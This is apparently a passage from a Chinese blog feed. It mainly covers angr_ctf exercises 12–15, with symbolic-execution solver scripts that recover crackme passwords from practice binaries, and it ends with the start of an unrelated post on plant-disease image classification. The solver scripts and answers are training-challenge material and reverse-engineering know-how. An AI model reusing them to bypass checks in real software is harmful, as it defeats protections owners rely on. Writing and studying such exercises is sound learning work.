<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">user_input_buffer_address = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492D6</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_check_equals_</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> tmp</span><br><span class="line">        tmp += <span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>(state.memory.load(state.solver.<span class="built_in">eval</span>(state.regs.eax),<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(state.solver.<span class="built_in">eval</span>(state.memory.load(state.solver.<span class="built_in">eval</span>(state.regs.eax),<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x8049287</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_check_equals_</span>(<span class="params">state,length = <span class="number">20</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    check_equals_called_address = <span class="number">0x80492EB</span></span><br><span class="line">    simulation = project.factory.simgr()</span><br><span class="line">    simulation.explore(find=check_equals_called_address)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>这里进行一点 debug 看看…</p>
<p>修改代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">user_input_buffer_address = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    project = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492D6</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_for_fun</span>(<span class="params">state, length = <span class="number">11</span></span>):</span><br><span class="line">        <span class="keyword">global</span> tmp</span><br><span class="line">        tmp += <span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>((state.solver.<span class="built_in">eval</span>(state.regs.eax))))</span><br><span class="line">        <span class="comment"># print( state.solver.eval((state.solver.eval(state.regs.eax))) )   </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>((state.solver.<span class="built_in">eval</span>(state.regs.eax)))), end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x8049287</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_scanf</span>(<span class="params">state, length = <span class="number">20</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80492EB</span></span><br><span class="line">    simulation = project.factory.simgr()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># @project.hook(0x80492B5)</span></span><br><span class="line">    <span class="comment"># def skip_stash(state, length = 14):</span></span><br><span class="line">    <span class="comment">#     nonlocal simulation</span></span><br><span class="line">    <span class="comment">#     print(&quot;len : &quot; + str(len(simulation.stashes)))</span></span><br><span class="line"></span><br><span class="line">    simulation.explore(find=check_equals_called_address)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>打印的内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T W W Z Z Z Z C C C C C C C C F F F F F F F F F F F F F F F F I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L</span><br></pre></td></tr></table></figure>
<p>实际上，这里去重之后就是正确答案了，说明这里出现了路径爆炸，在某个地方被分化，stash 内路径数量翻倍了，导致每次 bfs 路径都幂指数上升了</p>
<p>猜测是因为输入的不确定，在赋值的时候就需要 hook 掉，把这段补上（打印 stash 的长度看眼）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x80492B5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">skip_stash</span>(<span class="params">state, length = <span class="number">14</span></span>):</span><br><span class="line">    <span class="keyword">nonlocal</span> simulation</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;len : &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(simulation.stashes)))</span><br></pre></td></tr></table></figure>
<p>看一下目前 hook 后剩下的代码（ida 中 patch 替代）</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027152918240.png" alt="image-20231027152918240"></p>
<p>晚上睡前想着，会不会是循环的时候 <code>jle</code>  给分化出来了 stash，但是早起看了眼前面的程序，也是循环应该没有问题的</p>
<p>加上上面又 hook 的代码，输出大约如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">len : 9</span><br><span class="line">T len : 9</span><br><span class="line">len : 9</span><br><span class="line">W W len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">Z Z Z Z len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">C C C C C C C C len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">len : 9</span><br><span class="line">F F F F F F F F F F F F F F F F len : 9</span><br></pre></td></tr></table></figure>
<p>结果 stash 长度并没有变化，但是仍旧有路径分化的现象，这就有些闹鬼了</p>
<p>打在上面看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">user_input_buffer_address = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    project = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492D6</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_for_fun</span>(<span class="params">state, length = <span class="number">11</span></span>):</span><br><span class="line">        <span class="keyword">global</span> tmp</span><br><span class="line">        tmp += <span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>((state.solver.<span class="built_in">eval</span>(state.regs.eax))))</span><br><span class="line">        <span class="comment"># print( state.solver.eval((state.solver.eval(state.regs.eax))) )   </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>((state.solver.<span class="built_in">eval</span>(state.regs.eax)))), end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">nonlocal</span> simulation</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len : &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(simulation.stashes)))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x8049287</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_scanf</span>(<span class="params">state, length = <span class="number">20</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80492EB</span></span><br><span class="line">    simulation = project.factory.simgr()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492B5</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_stash</span>(<span class="params">state, length = <span class="number">14</span></span>):</span><br><span class="line">        <span class="number">1</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    simulation.explore(find=check_equals_called_address)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>结论是 stash 还是 9，为啥 9 啊，整个程序才 9 个 <code>basic block</code> ，结束地址前面已经不存在分支了</p>
<p>这里直接从 scanf 后面开始 <code>init blank_state</code>  也是一样的结果，说明不是 <code>scanf</code>  或者环境变量传入的问题</p>
<p>问了 r1mao 学长，发现这里对 <code>stash</code>  和 <code>state</code>  的理解有点问题了：</p>
<p>state 会分在不同 types 的 stash，如果这里打印 <code>simulation.active</code>  的话，得到的就是当前的 state 数量，和执行的重复数量结果是一致的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">active len : 32</span><br><span class="line">stashLen : 9</span><br></pre></td></tr></table></figure>
<p>打印一下 stash 和 state 的结构<br>
实际上是这样子的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stash:</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">active              |              kill              |              etc.          </span><br><span class="line">   |                  |							     |</span><br><span class="line">   ----&gt; active state               ----&gt; killed state         ----&gt; else state</span><br></pre></td></tr></table></figure>
<p>所以应该这样子用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simulation.stashes[<span class="string">&#x27;active&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>检查一下是不是 <code>jle</code>  惹的锅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x80492E9</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test01</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;len before jle&quot;</span>,<span class="built_in">len</span>(simulation.stashes[<span class="string">&#x27;active&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x80492B5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test01</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;len after jle&quot;</span>,<span class="built_in">len</span>(simulation.stashes[<span class="string">&#x27;active&#x27;</span>]))   </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不是，那还好：</span><br><span class="line">len before jle 1</span><br><span class="line">len after jle 1</span><br><span class="line">len before jle 2</span><br><span class="line">len before jle 2</span><br><span class="line">len after jle 2</span><br><span class="line">len after jle 2</span><br></pre></td></tr></table></figure>
<p>同理，只剩一个地方了…</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027202218062.png" alt="image-20231027202218062"></p>
<p>这下赛博鬼抓到了…hook 以后机器指令没跳过去…</p>
<p>ok，找到了，语法错误，也没报…</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    project = angr.Project(<span class="string">&quot;./angr&quot;</span>)</span><br><span class="line"></span><br><span class="line">    start_address = <span class="number">0x80492A5</span></span><br><span class="line">    initial_state = project.factory.blank_state(</span><br><span class="line">      addr=start_address,</span><br><span class="line">      add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                      angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">    )</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    address_to_check_constraint = <span class="number">0x80492EB</span></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492D6</span>, length = <span class="number">11</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_for_fun</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> tmp</span><br><span class="line">        tmp += <span class="built_in">chr</span>(state.solver.<span class="built_in">eval</span>((state.solver.<span class="built_in">eval</span>(state.regs.eax))))</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=address_to_check_constraint)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<p>还是看看官方吧，虽然被折磨了一把…</p>
<p>这里是想教你用 <code>veritesting</code> ，这样子 <code>veritesting=True</code>  即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/12_angr_veritesting&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<h4 id="13_angr_static_binary"><a class="markdownIt-Anchor" href="#13_angr_static_binary">#</a> 13_angr_static_binary</h4>
<p>可以看到原本的 <code>strcmp</code>  函数被分解成了很复杂的样子，会导致 angr 陷进去出不来了，其他库函数也一样</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027204604093.png" alt="image-20231027204604093"></p>
<p>这里是编译时加了静态链接的参数导致的</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027204948008.png" alt="image-20231027204948008"></p>
<p>把系统函数 hook 掉换成 libc 和 glibc 里的标准符号即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line">proj.hook(<span class="number">0x8051E40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x8051E90</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x805EBE0</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x804AB50</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<h4 id="14_angr_shared_library"><a class="markdownIt-Anchor" href="#14_angr_shared_library">#</a> 14_angr_shared_library</h4>
<p>坏了，这题目编译不明白了开始</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027205911605.png" alt="image-20231027205911605"></p>
<p><s>直接 gh 上拿了… 懒得研究了…</s></p>
<p>从 so 里面导入的 check：</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027211858381.png" alt="image-20231027211858381"></p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027211814511.png" alt="image-20231027211814511"></p>
<p>直接看官方 exp 吧（也就是做了个模拟，不过这个挺经典的感觉，后面单独模拟函数会很用得上）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The shared library has the function validate, which takes a string and returns</span></span><br><span class="line"><span class="comment"># either true (1) or false (0). The binary calls this function. If it returns</span></span><br><span class="line"><span class="comment"># true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note: When you run this script, make sure you run it on</span></span><br><span class="line"><span class="comment"># lib14_angr_shared_library.so, not the executable. This level is intended to</span></span><br><span class="line"><span class="comment"># teach how to analyse binary formats that are not typical executables.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># The shared library is compiled with position-independent code. You will need</span></span><br><span class="line">  <span class="comment"># to specify the base address. All addresses in the shared library will be</span></span><br><span class="line">  <span class="comment"># base + offset, where offset is their address in the file.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">      <span class="string">&#x27;base_addr&#x27;</span> : base</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Initialize any symbolic values here; you will need at least one to pass to</span></span><br><span class="line">  <span class="comment"># the validate function.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>) <span class="comment"># 这里乱写一个就行</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Begin the state at the beginning of the validate function, as if it was</span></span><br><span class="line">  <span class="comment"># called by the program. Determine the parameters needed to call validate and</span></span><br><span class="line">  <span class="comment"># replace &#x27;parameters...&#x27; with bitvectors holding the values you wish to pass.</span></span><br><span class="line">  <span class="comment"># Recall that &#x27;claripy.BVV(value, size_in_bits)&#x27; constructs a bitvector</span></span><br><span class="line">  <span class="comment"># initialized to a single value.</span></span><br><span class="line">  <span class="comment"># Remember to add the base value you specified at the beginning to the</span></span><br><span class="line">  <span class="comment"># function address!</span></span><br><span class="line">  <span class="comment"># Hint: int validate(char* buffer, int length) &#123; ...</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  validate_function_address = base + <span class="number">0x670</span></span><br><span class="line">  initial_state = project.factory.call_state(</span><br><span class="line">                    validate_function_address,</span><br><span class="line">                    buffer_pointer,</span><br><span class="line">                    claripy.BVV(<span class="number">8</span>, <span class="number">32</span>),</span><br><span class="line">                    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                                   angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Inject a symbolic value for the password buffer into the program and</span></span><br><span class="line">  <span class="comment"># instantiate the simulation. Another hint: the password is 8 bytes long.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state.memory.store(buffer_pointer, password)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># We wish to reach the end of the validate function and constrain the</span></span><br><span class="line">  <span class="comment"># return value of the function (stored in eax) to equal true (value of 1)</span></span><br><span class="line">  <span class="comment"># just before the function returns. We could use a hook, but instead we</span></span><br><span class="line">  <span class="comment"># can search for the address just before the function returns and then</span></span><br><span class="line">  <span class="comment"># constrain eax</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  check_constraint_address = base + <span class="number">0x71c</span></span><br><span class="line">  simulation.explore(find=check_constraint_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Determine where the program places the return value, and constrain it so</span></span><br><span class="line">    <span class="comment"># that it is true. Then, solve for the solution and print it.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)</span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<hr>
<p>莫名其妙的下面变成 pwn 题了…</p>
<h6 id="-pwn-"><a class="markdownIt-Anchor" href="#-pwn-">#</a> -pwn-</h6>
<h4 id="15_angr_arbitrary_read"><a class="markdownIt-Anchor" href="#15_angr_arbitrary_read">#</a> 15_angr_arbitrary_read</h4>
<p>乍看一下就很怪了，只得翻 exp，发现是用 pwn…</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231027213412278.png" alt="image-20231027213412278"></p>
<p><s>那这里到了期待已久的 auto pwn 环节哩</s></p>
]]></content>
  </entry>
  <entry>
    <title>cv与一些classify事项记录</title>
    <url>/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="preface一些project记录慢慢学吧调参炼丹"><a class="markdownIt-Anchor" href="#preface一些project记录慢慢学吧调参炼丹">#</a> preface: 一些 project 记录，慢慢学吧调参炼丹</h6>
<span id="more"></span>
<h5 id="需要实现的功能是接收树莓派传过来的植物图像对其是否病害进行分类预测用的训练集是这个病虫害分类数据集-飞桨ai-studio-baiducom训练集的话需要写一个加载json数据的方法"><a class="markdownIt-Anchor" href="#需要实现的功能是接收树莓派传过来的植物图像对其是否病害进行分类预测用的训练集是这个病虫害分类数据集-飞桨ai-studio-baiducom训练集的话需要写一个加载json数据的方法">#</a> 需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是 [这个](<a href="https://aistudio.baidu.com/aistudio/datasetdetail/76075">病虫害分类数据集 - 飞桨 AI Studio (baidu.com)</a>)，训练集的话需要写一个加载 json 数据的方法</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_folders_by_class</span>(<span class="params">json_file_path, image_folder_path, output_folder_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(json_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        labels_data = json.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分割训练集和验证集</span></span><br><span class="line">    train_data, val_data = train_test_split(labels_data, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name, data <span class="keyword">in</span> [(<span class="string">&#x27;train&#x27;</span>, train_data), (<span class="string">&#x27;val&#x27;</span>, val_data)]:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">            class_folder = os.path.join(output_folder_path, name, <span class="built_in">str</span>(item[<span class="string">&#x27;disease_class&#x27;</span>]))</span><br><span class="line">            os.makedirs(class_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            shutil.copy(os.path.join(image_folder_path, item[<span class="string">&#x27;image_id&#x27;</span>]), os.path.join(class_folder, item[<span class="string">&#x27;image_id&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<h5 id="最开始使用的是resnet50后面感觉正确率太低了会不会跟模型有关改成densenet169效果是差不太多"><a class="markdownIt-Anchor" href="#最开始使用的是resnet50后面感觉正确率太低了会不会跟模型有关改成densenet169效果是差不太多">#</a> 最开始使用的是 ResNet50，后面感觉正确率太低了会不会跟模型有关，改成 densenet169，效果是差不太多…</h5>
<h5 id="还发现一个小问题数据集里面都是带病的植物class好像没有健康的"><a class="markdownIt-Anchor" href="#还发现一个小问题数据集里面都是带病的植物class好像没有健康的">#</a> 还发现一个小问题，数据集里面都是带病的植物 class，好像没有健康的…</h5>
<h5 id="于是乎感觉反正准确率偏低了干脆根据置信度分一类专门来判别没病的植物么得重写一些训模型的部分log一下平均置信度和方差然后假装正则大概放一个置信度来判别"><a class="markdownIt-Anchor" href="#于是乎感觉反正准确率偏低了干脆根据置信度分一类专门来判别没病的植物么得重写一些训模型的部分log一下平均置信度和方差然后假装正则大概放一个置信度来判别">#</a> 于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log 一下平均置信度和方差，然后假装正则大概放一个置信度来判别</h5>
<p><img loading="lazy" data-src="cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230717164424184.png" alt="image-20230717164424184"></p>
<h5 id="大概大概这样子吧"><a class="markdownIt-Anchor" href="#大概大概这样子吧">#</a> 大概大概这样子吧</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">predict_image</span>(<span class="params">image_path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    img = data_transform(img).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    img = img.to(device)</span><br><span class="line">    output = model(img)</span><br><span class="line">    probs = torch.nn.functional.softmax(output, dim=<span class="number">1</span>)</span><br><span class="line">    max_prob, preds = torch.<span class="built_in">max</span>(probs, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(max_prob)</span></span><br><span class="line">    threshold = <span class="number">0.7</span></span><br><span class="line">    <span class="keyword">if</span> max_prob &lt; threshold:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Low confidence&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> preds</span><br></pre></td></tr></table></figure>
<h5 id="最后正确率还是很一眼难尽目前是没做数据增强的应该是不能变太多主要是病害植物和普通植物确实分类不明显暂且原谅这程序的低准确率"><a class="markdownIt-Anchor" href="#最后正确率还是很一眼难尽目前是没做数据增强的应该是不能变太多主要是病害植物和普通植物确实分类不明显暂且原谅这程序的低准确率">#</a> 最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…</h5>
<h5 id="mark一个奇怪的事情训练模型过程中每个epoch正确率都还不错有50左右存好model以后再测试正确率就掉到个位数"><a class="markdownIt-Anchor" href="#mark一个奇怪的事情训练模型过程中每个epoch正确率都还不错有50左右存好model以后再测试正确率就掉到个位数">#</a> mark 一个奇怪的事情：训练模型过程中每个 epoch 正确率都还不错有 50 左右，存好 model 以后再测试正确率就掉到个位数。</h5>
<h6 id="7-18更新"><a class="markdownIt-Anchor" href="#7-18更新">#</a> *7-18 更新</h6>
